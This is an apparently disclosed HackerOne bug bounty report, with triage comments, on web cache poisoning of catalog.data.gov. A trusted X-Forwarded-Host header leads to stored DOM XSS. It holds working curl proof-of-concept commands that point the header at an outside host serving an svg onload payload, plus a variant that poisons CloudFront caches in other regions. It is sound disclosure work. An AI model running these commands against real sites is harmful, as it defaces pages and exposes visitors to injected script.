{"id":303730,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDM3MzA=","url":"https://hackerone.com/reports/303730","title":"Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-01-10T12:23:37.143Z","submitted_at":"2018-01-10T12:23:37.143Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"albinowax","url":"/albinowax","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":50592,"url":"https://hackerone.com/gsa_bbp","handle":"gsa_bbp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GSA Bounty","twitter_handle":null,"website":"http://gsa.gov","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-11-01T21:16:04.418Z","bug_reporter_agreed_on_going_public_at":"2018-10-22T08:25:26.812Z","team_member_agreed_on_going_public_at":"2018-11-01T21:16:04.340Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.\n\nThe root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the \u003cbody tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.\n\nThis behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. \n\nPlease be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:\n\n1. Run curl command to poison cache:\ncurl -i -s -k  -X $'GET' \\\n    -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \\\n    $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' \u003e /dev/null\n\n2. Visit the poisoned page:\nhttps://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6\n\n3. Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)\n\nBehind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into \"Mostrar más \u003csvg onload=alert(document.domain)\u003e\"\n\nThis is the offending line of JavaScript:\nvar template_more = ['\u003ctr class=\"toggle-show toggle-show-more\"\u003e', '\u003ctd colspan=\"' + cols + '\"\u003e', '\u003csmall\u003e', '\u003ca href=\"#\" class=\"show-more\"\u003e' + this.i18n('show_more') + '\u003c/a\u003e', '\u003ca href=\"#\" class=\"show-less\"\u003e' + this.i18n('show_less') + '\u003c/a\u003e', '\u003c/small\u003e', '\u003c/td\u003e', '\u003c/tr\u003e'].join('\\n');\n\nTo mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. \n\nPlease let me know if you have any questions.\n\nCheers,\n\nJames \u0026 Gareth\n\n## Impact\n\nAn attacker can deface most pages on catalog.data.gov.","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":252795,"file_name":"Screen_Shot_2018-01-10_at_12.11.01.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/252/795/d7c51591a6c2ad3957c229e1e37fe4764848d9e6/Screen_Shot_2018-01-10_at_12.11.01.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-10_at_12.11.01.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-10_at_12.11.01.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144151Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b2915ede4c9515bba53e8c73f8cf11f8214122665fccf1646d5b4e6b328fdf60","file_size":249936,"type":"image/png"},{"id":252796,"file_name":"Screen_Shot_2018-01-10_at_12.13.45.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/252/796/b6b4478eac78315f6e0ead7aabeaa4bf1bcd9312/Screen_Shot_2018-01-10_at_12.13.45.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-10_at_12.13.45.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-10_at_12.13.45.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144151Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e5f4d9af2019548b786943c1836a67074da7d8e8b2510251e67a2ebc99de7048","file_size":263309,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":75,"voters":["badf00d","sp1d3rs","karma7","stefanofinding","albinowax","tiger24","bl4de","sameerphad72","dphoeniixx","spam404","and 65 more..."],"severity":{"rating":"high","score":8.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"high","availability":"low"}},"structured_scope":{"databaseId":81477,"asset_type":"URL","asset_identifier":"https://catalog.data.gov","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2280240,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @albinowax, \n\nThank you for your submission! This looks interesting but I'm not able to reproduce with given steps, could you share any additional details if I need to follow?\n\nRegards.\n\n{F253348}","automated_response":false,"created_at":"2018-01-12T14:55:17.923Z","updated_at":"2018-01-12T14:55:17.923Z","actor":{"username":"chessmast3r","cleared":false,"url":"/chessmast3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/459/6b3c5fca9df9cde7fe36b55238b13d2cea86ea80_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":253348,"filename":"req.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/253/348/52d0d28c20c797f99e579e76e52942147a626deb/req.PNG?response-content-disposition=attachment%3B%20filename%3D%22req.PNG%22%3B%20filename%2A%3DUTF-8%27%27req.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144151Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e0a99da6cc3205d21fa65f25a25f60deb35ea95dc15693386fdd86e9b81d3bf0"}],"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2280342,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Which bit can't you replicate, the XFH header getting reflected, or the reflection getting stored in the cache?","automated_response":false,"created_at":"2018-01-12T16:04:26.214Z","updated_at":"2018-01-12T16:04:26.214Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2280374,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's an improved PoC that uses a timestamp to avoid caching issues:\n\n1. Execute the following command\n```url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) \u0026\u0026 curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger \u0026\u0026 echo -e \"\\n\\n$url\"```\n\n2. The previous step should print out a URL like https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=1515773700 on the last line. If you don't see the URL, something went wrong. Load the URL that gets printed in Chrome\n\n3. Wait a few seconds for the alert","automated_response":false,"created_at":"2018-01-12T16:15:54.979Z","updated_at":"2018-01-12T16:16:06.727Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282602,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThank you for the additional information! We will investigate and get back to you as soon as we have an update to share.\n\nRegards.\n@joystick","automated_response":false,"created_at":"2018-01-13T17:22:06.498Z","updated_at":"2018-01-13T17:22:06.498Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282606,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We were able to replicate the issue and will now escalate to our internal team for further investigation. Thank you!","automated_response":false,"created_at":"2018-01-13T17:24:42.538Z","updated_at":"2018-01-13T17:24:42.538Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282610,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-01-13T17:29:43.572Z","updated_at":"2018-01-13T17:29:43.572Z","additional_data":{"old_severity":"Critical","new_severity":"Medium (5.8)","old_severity_id":106950,"new_severity_id":107751},"actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282625,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good to hear you've replicated it.\n\nJust in case the logic behind the original critical severity isn't clear, it's that by tweaking the cURL command slightly it's possible to poison https://catalog.data.gov/dataset/consumer-complaint-database so that random visitors will get exploited. This technique can be used on *every* dataset, and also possibly every other page on catalog.data.gov (I'm working on that).","automated_response":false,"created_at":"2018-01-13T17:38:25.364Z","updated_at":"2018-01-13T17:38:25.364Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282882,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-01-13T22:47:42.196Z","updated_at":"2018-01-13T22:47:42.196Z","additional_data":{"old_severity":"Medium (5.8)","new_severity":"High (7.4)","old_severity_id":107751,"new_severity_id":107790},"actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2282886,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax - the complexity of the attack was set to `High` because Cloudfront would serve the cached response only to users from the same region as the attacker. Confidentiality is set to `Low` since there isn't much to any sensitive information to extract. Integrity was re-set to `High` given the fact that the injected JS might allow the attacker to override the page's content. However, the attack would still require user interaction, and as a result the overall CVSS is `High (7.4)`. If you have any additional information that would help us better assess this report, please let us know.","automated_response":false,"created_at":"2018-01-13T22:55:10.029Z","updated_at":"2018-01-13T22:55:10.029Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2285007,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @albinowax - \n\nThank you for your submission. We have validated this issue and forwarded the report to the responsible team for this application. They will evaluate and let us know whether or not they will be implementing a fix.\n\nThanks!","automated_response":false,"created_at":"2018-01-15T09:48:26.470Z","updated_at":"2018-01-15T09:48:26.470Z","actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2317508,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The statement that the complexity of this attack is 'high' because Cloudfront would serve the cached response only to users from the same region as the attacker isn't entirely accurate.\n\nAn attacker can easily poison the cache in arbitrary regions by using a service like `https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov\u0026t=A` to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:\n\ncurl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/' https://catalog.data.gov/dataset/consumer-complaint-database?zxcv=1234\n\nCheers.","automated_response":false,"created_at":"2018-01-25T16:56:00.431Z","updated_at":"2018-01-25T16:56:00.431Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2338386,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-01-31T13:26:23.236Z","updated_at":"2018-01-31T13:26:23.236Z","additional_data":{"old_severity":"High (7.4)","new_severity":"High (8.6)","old_severity_id":107790,"new_severity_id":113917},"actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2338387,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax - thank for the follow-up! we adjusted to the complexity to `High`.","automated_response":false,"created_at":"2018-01-31T13:27:07.551Z","updated_at":"2018-01-31T13:27:07.551Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2354064,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-02-06T01:06:07.838Z","updated_at":"2018-02-06T01:06:07.838Z","actor":{"url":"/gsa_bbp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GSA Bounty"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gsa_bbp","collaborator":{"username":"albinowax","url":"/albinowax"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2817872,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It looks like this vulnerability hasn't been fixed since I reported it several months ago. I should mention that I'm planning to deliver a talk on the underlying attack concept/technique at a major security conference (Black Hat USA) in a couple of month's time. Unfortunately after this point it's likely that other people will independently discover this vulnerability and potentially exploit it. As such, I really think it's worth resolving this issue promptly.","automated_response":false,"created_at":"2018-05-30T14:03:37.507Z","updated_at":"2018-05-30T14:03:37.507Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2819559,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax Thanks for the poke, and the heads up. We'll investigate this internally and will update this thread.","automated_response":false,"created_at":"2018-05-30T19:05:09.960Z","updated_at":"2018-05-30T19:05:09.960Z","actor":{"username":"ericmillgsa","cleared":false,"url":"/ericmillgsa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/176/399/c648b490407d21a684f0581e4d83c5ff29bdc66b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3025709,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax We've tested a fix to this issue, and are still in the process of deploying the fix to production, as we have had internal challenges that have made it difficult to do this as fast as we'd usually like. I don't have a specific ETA right now, but we're aware of the issue and understand that this issue will be publicly disclosed, and intend to have a fix deployed before that time. Thanks again for all the details you've given, and for the notice you've provided of your intent to disclose it.","automated_response":false,"created_at":"2018-07-10T17:30:35.548Z","updated_at":"2018-07-10T17:30:35.548Z","actor":{"username":"ericmillgsa","cleared":false,"url":"/ericmillgsa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/176/399/c648b490407d21a684f0581e4d83c5ff29bdc66b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3093683,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@albinowax Just so you know, we're still tracking and aim to have this resolved soon.","automated_response":false,"created_at":"2018-07-24T20:24:28.998Z","updated_at":"2018-07-24T20:24:28.998Z","actor":{"username":"ericmillgsa","cleared":false,"url":"/ericmillgsa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/176/399/c648b490407d21a684f0581e4d83c5ff29bdc66b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gsa_bbp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3096853,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update. Is it safe to assume this will be resolved by the 9th August? 